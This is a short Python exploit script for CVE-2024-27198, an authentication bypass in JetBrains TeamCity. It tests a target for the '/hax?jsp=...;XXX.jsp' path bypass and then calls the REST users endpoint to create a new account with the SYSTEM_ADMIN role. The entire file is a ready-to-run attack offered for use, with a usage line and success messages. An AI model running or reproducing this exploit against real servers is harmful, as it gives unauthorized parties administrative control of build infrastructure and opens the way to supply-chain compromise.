# /bin/python3
# --------------------
# Author: Jorge Reyes
# Credits: https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/
#--------------------

import json, requests, sys

RED = '\033[91m'
GREEN = '\033[92m'
BLUE = '\033[94m'
BOLD = '\033[1m'
RESET = '\033[0m'

if len(sys.argv) != 4:
    print ('Usage: python3 cve-2024-27198.py http://example.com username password')
    exit(1)

url = sys.argv[1]
usr = sys.argv[2]
passwd = sys.argv[3]

def check(url):
    endpoint='/app/rest/server'
    r = requests.get(url+endpoint)
    if 'Authentication required' in r.text:
        r = requests.get(url+'/hax?jsp=/app/rest/server;XXX.jsp')
        if r.status_code == 200:
            return True

def exploit(url,username,password):
    bypass = '/hax?jsp=/app/rest/users;XXX.jsp'
    headers = {'Content-Type': 'application/json'}
    data = {"username": username,
            "password": password,
            "email": "pwn",
            "roles": { "role": [ { "roleId": "SYSTEM_ADMIN","scope": "g"}]}
            }
    exploit = requests.post(url+bypass,headers=headers,data=json.dumps(data))
    if exploit.status_code == 200:
        print(f'{BOLD}{GREEN}[+] Exploited, you can access with credentials:{RESET} {BOLD}{BLUE}{username}{RESET}:{BOLD}{BLUE}{password}{RESET}')

if check(url):
    exploit(url,usr,passwd)
else:
    print (f'{BOLD}{RED}[-] Target seems to be not vulnerable :({RESET}')
